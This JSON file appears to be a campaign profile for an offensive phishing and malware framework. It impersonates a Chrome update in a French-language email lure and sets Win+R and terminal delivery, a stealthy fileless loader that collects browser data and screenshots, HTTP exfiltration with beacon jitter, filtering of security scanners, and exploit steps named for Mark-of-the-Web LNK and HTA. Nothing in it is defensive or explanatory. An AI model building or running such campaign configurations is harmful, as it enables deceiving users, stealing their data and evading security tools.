{
  "id": "update",
  "label": "Mise à jour navigateur/système",
  "persona": {
    "brand": "Chrome Update",
    "voice": "bannière de mise à jour",
    "urgency": "medium",
    "lexicon": ["mise à jour", "version", "sécurité", "redémarrage"]
  },
  "scenarios": ["browser_update", "software_update"],
  "channels": {
    "email": {
      "subject": "Votre navigateur doit être mis à jour avant {deadline}",
      "body": "Bonjour {name},\n\nVotre version du navigateur n'est plus supportée et certaines fonctionnalités sont désactivées. Installez la dernière révision pour continuer :\n\n{lure}\n\nRéférence {ref} — {agent}"
    }
  },
  "context": {
    "inject": ["deadline", "ref", "name"]
  },
  "techniques": {
    "surfaces": ["winr", "terminal"],
    "min_reliability": 4,
    "prefer_tags": ["fileless", "stealth"],
    "avoid": ["winr-bitsadmin"]
  },
  "payload": {
    "kind": "loader",
    "collect": ["browser", "screen"],
    "exfil": "http",
    "sleep": 45,
    "jitter": 0.3,
    "edr_hint": ""
  },
  "opsec": {
    "filter_scanners": true,
    "dwell_hours": 4,
    "variant_count": 3
  },
  "chain": ["lure", "stager", "stage2", "collect", "exfil"],
  "exploits": ["motw-lnk", "hta-oneclick"]
}
